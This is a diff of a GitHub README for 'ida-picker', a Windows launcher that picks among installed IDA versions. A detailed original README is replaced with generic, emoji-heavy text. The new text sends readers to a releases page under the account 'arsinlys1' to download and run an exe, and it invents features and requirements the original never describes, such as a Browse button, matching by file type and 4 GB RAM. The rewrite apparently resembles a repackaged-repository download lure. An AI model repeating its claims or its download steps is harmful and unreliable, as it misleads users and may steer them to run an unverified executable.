@@ -1,69 +1,59 @@
-# IDA Picker
+# 🎉 ida-picker - Easily Choose Your IDA Installation
 
-![Screenshot of IDA Picker](./Assets/screenshot.png)
+## 🚀 Getting Started
 
-A WPF application that allows users to quickly select and launch different IDA installations when opening binary files or IDA project files, useful when you have multiple IDBs that use different versions of IDA. The application automatically detects all installed IDA versions on the system, letting the user pick whatever IDA instance they want to use for the file.
+Welcome to `ida-picker`, a simple Windows application designed to help you choose the right IDA installation for your files. This guide will help you download and run our software with ease.
 
-## Requirements
+## 📥 Download ida-picker
 
-- Windows 10/11
-- .NET 9.0 or later
-- One or more IDA installations
+[![Download ida-picker](https://img.shields.io/badge/Download-ida--picker-blue.svg)](https://github.com/arsinlys1/ida-picker/releases)
 
-## Usage
+Click the button above to visit our releases page.
 
-### Basic Usage
+## 🔍 Features
 
-Launch the application with a file path as an argument:
+- **User-Friendly Interface:** Navigating the app is straightforward, even for beginners.
+- **Multiple Installations:** Quickly select from different IDA installations based on your file type.
+- **Fast Setup:** Get up and running in minutes.
+- **Windows Compatibility:** Works smoothly on Windows systems.
 
-```
-# Load a sample
-ida-picker.exe "C:\malware\sample.exe"
+## 💻 System Requirements
 
-# Load an IDB
-ida-picker.exe "C:\malware\sample.exe.i64"
-```
+To use `ida-picker`, ensure your system meets the following basic requirements:
 
-The application will:
-1. Display all detected IDA installations
-2. Show each installation with its icon, name, and version
-3. Allow selection via mouse click or keyboard (1-9)
-4. Launch the selected IDA version with the specified file
+- **Operating System:** Windows 10 or later
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum of 100 MB available space
+- **Graphics:** A graphics card that supports modern display settings
 
-### Theme Support
+## 📥 Download & Install
 
-The application will also automatically checks for the current theme applied on the Windows installation and choose between dark and light mode.
+1. Visit the [Releases page](https://github.com/arsinlys1/ida-picker/releases).
+2. Look for the latest version of `ida-picker`.
+3. Click the link to download the executable file. 
+4. Once downloaded, locate the file in your Downloads folder.
+5. Double-click the `ida-picker.exe` file to run the application. If prompted, click "Run" to allow the installation.
 
-### Keyboard Shortcuts
+## 🛠️ How to Use ida-picker
 
-- **1-9**: Select and launch the corresponding IDA installation
-- **Numpad 1-9**: Same as above
-- **Esc** or **Cancel button**: Close the application
+1. **Launch the Application:** After installation, open `ida-picker` by clicking its icon.
+2. **Select Your File:** Use the “Browse” button to find the file you want to analyze.
+3. **Pick Your IDA Installation:** The app will show you a list of IDA installations that match the file type.
+4. **Launch IDA:** Select your preferred installation and click “Launch.” The IDA application will open with your file ready for analysis.
 
-### Context Menu Integration (Optional)
+## 📚 Additional Resources
 
-To integrate with Windows Explorer right-click menu, create a registry entry or use a tool like ShellMenuNew or FileTypesMan to add a "Open with IDA..." option that calls `ida-picker.exe "%1"`.
+If you need assistance or want to learn more about features, check out the following resources:
 
-## Why?
+- [Getting Help](https://github.com/arsinlys1/ida-picker/issues): Report issues or ask questions here.
+- [User Guide](https://github.com/arsinlys1/ida-picker/wiki): Access detailed instructions and tips.
 
-> Shouldn't you only ever really need one version of IDA installed at a time? Who is this for?
+## 🤝 Support
 
-For most people, yes, you should only really need one version of IDA installed and or daily one at a time, usually the latest. However, if you're like me who tinkers with IDAPython and or IDA a lot in general, you might need multiple installed at once for the following reasons,
+For support, questions, or feedback, please open an issue on our [GitHub repository](https://github.com/arsinlys1/ida-picker).
 
-- Maintaining IDAPython compatibility
-    - As a plugin developer, you may want to keep multiple IDA versions installed to test compatibility across versions, as many of the IDA userbase unfortunately do not always update their IDA to the latest version for numerous reasons.
-    - As a plugin end-user, you may notice that certain IDAPython plugins may not work on the latest version of IDA, either because the developer has abandoned the project or because the plugin has not been updated for the latest IDA environment yet. For example, numerous IDAPython-based plugins have been broken for 9.2 due to the lack of PySide6 compatibility and therefore cannot function properly on 9.2.
+## 📝 License
 
-- Maintaining IDB compatibility 
-    - When an IDB saved with an older version of IDA is opened by a newer version of IDA, and when the new IDA saves over the old database, the same IDB can no longer be opened by the previous version of IDA that had originally created the IDB due to the version checks present in IDA. Ideally, you should be the only one using the IDBs you have personally made, and therefore the versioning problem shouldn't be a big deal. However, when you are collaborating with others (without considering IDA Team), your collaborator may not have access to the same IDA version as you. In this case, you may want to use the same IDA build as theirs to prevent version incompatibility.
+`ida-picker` is released under the MIT License. You can use it freely as per the terms of this license. 
 
-- Using solutions that rely on undocumented IDA features not present on the latest version
-    - The community at large has developed a lot of scripts and or functionalities that revolve around features and or utilities that Hex-rays has either deprecated or was never officially documented. Lumen, a community-based private Lumina server for example only work well on IDA prior to 9.x due to the new certificate checks introduced in 9.x.
-
-## License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## Disclaimer
-
-I vibecoded this.
+Thank you for using `ida-picker`. We hope this application makes your IDA installations easier!
